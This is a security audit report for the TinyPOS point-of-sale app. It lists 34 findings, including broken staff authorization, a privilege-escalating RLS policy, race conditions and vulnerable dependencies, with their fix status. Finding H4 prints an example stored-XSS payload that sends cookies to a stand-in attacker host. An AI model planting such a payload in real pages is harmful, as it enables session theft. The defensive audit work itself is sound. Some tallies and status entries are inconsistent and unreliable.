# TinyPOS Security Audit Report

**Date:** May 12, 2026  
**Scope:** Full codebase review — application code, database layer, dependencies, configuration  
**Severity ratings:** Critical → High → Medium → Low → Info

---

## Executive Summary

34 findings across the application (server actions, API routes, components), database layer (SQL/policies), and dependency/configuration layer. The most critical issues involve **broken authorization for non-owner staff** (making the RBAC system non-functional), **known-vulnerable dependencies**, and **RLS policy gaps** that allow privilege escalation.

---

## High

### H1. Broken Authorization — `getVendor()` Only Works for Owner

**Files:** `lib/vendor.ts:9-13`, all 10 server actions, all dashboard pages  
**Issue:** `getVendor()` queries `vendors` by `owner_id = user.id`. Staff members (managers/cashiers) are never the owner, so the query returns `null`, and they get redirected to `/onboarding`. The entire RBAC system (`lib/permissions.ts`, `lib/require-role.ts`) is unreachable for non-owners.

**Fix:** Look up the user's `vendor_id` from the `users` table first, then fetch the vendor by `id`.

### H2. All API Routes Only Authorize the Owner

**Files:** 20 API route files in `app/api/*/route.ts`  
**Issue:** Every API route resolves the vendor via `.eq('owner_id', user.id)`, mirroring H1. All API calls from staff users return `{"error":"Vendor not found"}` with HTTP 404.

**Fix:** Same as H1 — resolve vendor via `users.vendor_id` lookup.

### H3. `users_update` Policy Missing `WITH CHECK` — Privilege Escalation

**Files:** `supabase/rls-policies.sql:97-101`, `supabase/fix-recursion.sql:55-59`  
**Issue:** The `UPDATE` policy has a `USING` clause but no `WITH CHECK`. Any authenticated user targeting their own row (`auth_id = auth.uid()`) can set any column — including `role`, `is_super_admin`, `vendor_id`.

**Fix:** Add `WITH CHECK` that prevents users from changing their own role.

### H4. Stored XSS via Receipt Printing

**File:** `components/pos/pos-terminal.tsx:124-161`  
**Issue:** `printReceipt()` constructs HTML via template literals with unsanitized product names, vendor names, and receipt footer/header. A manager can set a product name like `<script>fetch('//evil.com/steal?c='+document.cookie)</script>` that executes on receipt print.

**Fix:** HTML-encode all user-controlled values in receipt construction. Use `textContent` instead of `innerHTML`.

### H5. Race Condition in Stock Deduction

**Files:** `app/(dashboard)/orders/actions.ts:112-121`, `app/api/orders/route.ts:107-116`  
**Issue:** Stock is deducted with non-atomic read-then-write. Two concurrent requests for the same product can both read the same stock value, enabling overselling.

**Fix:** Use atomic conditional updates: `.update({ stock_quantity: existing - qty }).gte('stock_quantity', qty)` or a `SECURITY DEFINER` SQL function.

### H6. `increment_discount_uses()` Has No Vendor Isolation

**File:** `supabase/rls-policies.sql:287-295`  
**Issue:** This `SECURITY DEFINER` function does not scope the `UPDATE` to the caller's vendor. Any authenticated user can inflate any discount's `uses_count` across tenants.

**Fix:** Add `AND vendor_id = current_vendor_id()` to the `WHERE` clause.

### H7. Next.js 16 Known Vulnerabilities (13 advisories)

**File:** `package.json:31` — `"next": "^16.2.1"` (installed 16.2.4)  
**Issue:** 5 high-severity advisories including middleware/proxy bypass, SSRF via WebSocket, and DoS. The proxy bypasses are especially relevant since this app uses a custom proxy + Supabase middleware pattern.

**Fix:** Upgrade to `next@^16.2.6`.

### H8. `xlsx` Package Known Vulnerabilities (2 high)

**File:** `package.json:41` — `"xlsx": "^0.18.5"`  
**Issue:** Prototype Pollution and ReDoS. The package is effectively unmaintained.

**Fix:** Upgrade to `xlsx@^0.20.2` or migrate to a maintained alternative (e.g. `exceljs`).

---

## Medium

### M1. Storage Bucket: Unrestricted Uploads from Any Vendor

**File:** `supabase/storage-buckets.sql:9-13`  
**Issue:** Any authenticated user from any vendor can upload files to the shared `product-images` bucket. Enables storage bombing, malicious file uploads, and cross-vendor image pollution.

**Fix:** Add per-vendor folder isolation or vendor-scoped upload policies.

### M2. Storage Bucket: No MIME/Size Restrictions

**File:** `supabase/storage-buckets.sql:9-13`  
**Issue:** No file type or size validation at the storage level.

**Fix:** Add storage object policies restricting MIME types and maximum file size.

### M3. Weak Password Policy

**Files:** `components/auth/sign-up.tsx:21`, `app/reset-password/page.tsx:18`  
**Issue:** Only 6-character minimum with no complexity requirements.

**Fix:** Enforce minimum 8 characters with uppercase, lowercase, and digit requirements.

### M4. Email Enumeration via Sign-Up

**File:** `components/auth/sign-up.tsx:63-75`  
**Issue:** Different toast messages for existing vs. new users reveal whether an email is pre-registered.

**Fix:** Return a consistent message regardless of whether the profile exists.

### M5. Information Disclosure via Raw Error Messages

**Files:** All API routes and server actions (e.g., `app/(dashboard)/products/actions.ts:44`)  
**Issue:** Raw PostgreSQL/Supabase error messages (including constraint names, schema details) are forwarded to clients.

**Fix:** Log detailed errors server-side; return generic messages to clients.

### M6. Potential Open Redirect in Auth Callback

**File:** `app/auth/callback/route.ts:14-23`  
**Issue:** Unvalidated `next` parameter and trusting `x-forwarded-host` header for redirects.

**Fix:** Validate `next` against an allowlist of known paths. Don't trust `x-forwarded-host`.

### M7. No Rate Limiting

**Files:** All server actions, all API routes, auth pages  
**Issue:** No rate limiting anywhere. Brute-force login, API flooding, mass resource creation are all unconstrained.

**Fix:** Add rate-limiting middleware (Upstash, Vercel KV, etc.) on auth and critical endpoints.

### M8. No File Type/Size Validation on Upload

**File:** `lib/supabase/storage.ts`  
**Issue:** `uploadProductImage` accepts any file type/size without validation. Complements M2 at the app layer.

**Fix:** Validate MIME type and file size before uploading.

### M9. Duplicate/Conflicting RLS Policies

**Files:** `supabase_schema.sql` vs `supabase/rls-policies.sql`  
**Issue:** Two files define overlapping policies with different naming conventions. If both are applied without `fix-recursion.sql`, some tables end up with duplicate or conflicting policies.

**Fix:** Consolidate into a single source of truth. Remove inline policies from `supabase_schema.sql`.

### M10. `is_super_admin` Field Is Ungoverned

**File:** `supabase_schema.sql:42`  
**Issue:** Column exists in the schema but has no RLS guard and no application-level check.

**Fix:** Either remove the unused field or add explicit RLS policies preventing users from setting it.

### M11. `sharp` in `devDependencies`

**File:** `package.json:53`  
**Issue:** `sharp` is needed at runtime for production image optimization but listed under `devDependencies`.

**Fix:** Move to `dependencies`.

### M12. `dotenv` in Production Dependencies

**File:** `package.json:27`  
**Issue:** Next.js natively loads `.env.local`. `dotenv` is unnecessary at runtime.

**Fix:** Move to `devDependencies` or remove.

---

## Low

### L1. Missing Content Security Policy (CSP)

**File:** `next.config.ts`  
**Issue:** No CSP headers configured. The app uses `dangerouslySetInnerHTML` in `layout.tsx`.

**Fix:** Add CSP via `next.config.ts` `headers()` function.

### L2. Missing HTTP Security Headers

**File:** `next.config.ts`  
**Issue:** No `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, `Referrer-Policy`, or `Permissions-Policy`.

**Fix:** Add via `next.config.ts` `headers()`.

### L3. Debug Console Logs in Production Code

**Files:** `app/layout.tsx:46-48`, `app/(dashboard)/orders/actions.ts:136`, `app/api/orders/route.ts:120`, etc.  
**Issue:** `console.log`/`console.error` statements in production code.

**Fix:** Remove or gate behind `process.env.NODE_ENV === 'development'`.

### L4. `Math.random()` for Filenames

**File:** `lib/supabase/storage.ts:6`  
**Issue:** Uses `cryptographically-weak` `Math.random()` for upload filenames.

**Fix:** Use `crypto.randomUUID()`.

### L5. Missing `WITH CHECK` on `users_insert` Policy

**File:** `supabase/rls-policies.sql:91-94`  
**Issue:** No `WITH CHECK` on the INSERT policy (uses `WITH CHECK` of `owns_vendor(vendor_id)` — actually this IS present). Retracted.

**Fix:** N/A — policy is correctly scoped.

### L6. Unvalidated `paymentMethod` Field

**Files:** `app/(dashboard)/orders/actions.ts:18`, `app/api/orders/route.ts:9`  
**Issue:** `paymentMethod: z.string()` accepts any value.

**Fix:** Use `z.enum(["cash", "card"])`.

### L7. No Validation on `productName` Length

**Files:** `app/(dashboard)/orders/actions.ts:14`, `app/api/orders/route.ts:8`  
**Issue:** `productName: z.string()` with no max length.

**Fix:** Add `.min(1).max(200)`.

### L8. No Negative Stock Check

**File:** `app/(dashboard)/inventory/actions.ts:30-36`  
**Issue:** `quantityChange: z.number().int()` allows values that make `stock` go negative.

**Fix:** Validate `after >= 0` or add `CHECK (stock_quantity >= 0)` in the DB.

### L9. `.env.example` Wrong Key Name

**File:** `.env.example:2`  
**Issue:** Uses `NEXT_PUBLIC_SUPABASE_ANON_KEY` but code reads `NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY`.

**Fix:** Update `.env.example` to match the actual key name.

### L10. `.claude/` Not in `.gitignore`

**File:** `.gitignore`  
**Issue:** `.claude/` directory (with `settings.local.json`) is not listed and could be accidentally committed.

**Fix:** Add `.claude/` to `.gitignore`.

### L11. `userScalable: false` Disables Zoom

**File:** `app/layout.tsx:29`  
**Issue:** Prevents zooming — accessibility concern per WCAG.

**Fix:** Remove `userScalable: false` or allow at least 2x scale.

---

## Informational

### I1. Service Worker Cache Strategy

**File:** `public/sw.js`  
**Issue:** Cache-first strategy can serve stale authenticated content. No versioning beyond `tinypos-v1`.

**Recommendation:** Implement cache-busting, network-first for API routes.

### I2. Audit Log Uses TEXT Instead of JSONB

**File:** `supabase_schema.sql:162-173`  
**Issue:** `old_data` and `new_data` are `TEXT`, hard to query forensically.

**Recommendation:** Use `JSONB` for structured querying.

### I3. No Docker Files

No `Dockerfile` or `.dockerignore`. If Docker is added, ensure `.env.local` is excluded from build context.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 8 |
| Medium | 12 |
| Low | 11 |
| Info | 3 |
| **Total** | **34** |

## Priority Actions

## Fix Status

| # | Finding | Status |
|---|---------|--------|
| H1, H2 | `getVendor()` and all API routes for staff users | ✅ Fixed |
| H3 | `users_update` policy — `WITH CHECK` added | ✅ Fixed |
| H4 | Receipt HTML sanitized (XSS) | ✅ Fixed |
| H5 | Atomic stock deduction | ✅ Fixed |
| H6 | `increment_discount_uses()` vendor isolation | ✅ Fixed |
| H7, H8 | `next` upgraded to `^16.2.6`, migrated `xlsx` → `exceljs` | ✅ Fixed |
| M1, M2, M8 | Storage bucket — app-layer MIME/size + DB extension check | ✅ Fixed |
| M9 | SQL consolidated — policies removed from `supabase_schema.sql` | ✅ Fixed |
| L10 | `.claude/` added to `.gitignore` | ✅ Fixed |
| C1 | Clerk key removed | ✅ Fixed |

### Remaining (not in scope for this pass)

| Finding | Notes |
|---------|-------|
| No rate limiting (M7) | Requires infrastructure (Upstash/Vercel KV) |
| Weak password policy (M3) | `z.string().min(6)` — increase to 8+ complexity |
| Email enumeration (M4) | Sign-up messages reveal whether email is pre-registered |
| Info disclosure via error messages (M5) | Raw Supabase errors returned to clients |
| Open redirect in auth callback (M6) | Unvalidated `next` param |
| Missing CSP/security headers (L1, L2) | `next.config.ts` |
| `xlsx` vulnerabilities (H8) | Migrated to `exceljs` ✅ |
| Debug console logs (L3) | Present in production code |
| `paymentMethod` unvalidated (L6) | Should be `z.enum(["cash", "card"])` |
| No negative stock check (L8) | Inventory adjustment can make stock negative |
| `.env.example` wrong key name (L9) | Uses `ANON_KEY` but code reads `PUBLISHABLE_KEY` |
| `userScalable: false` (L11) | Accessibility — prevents zoom |
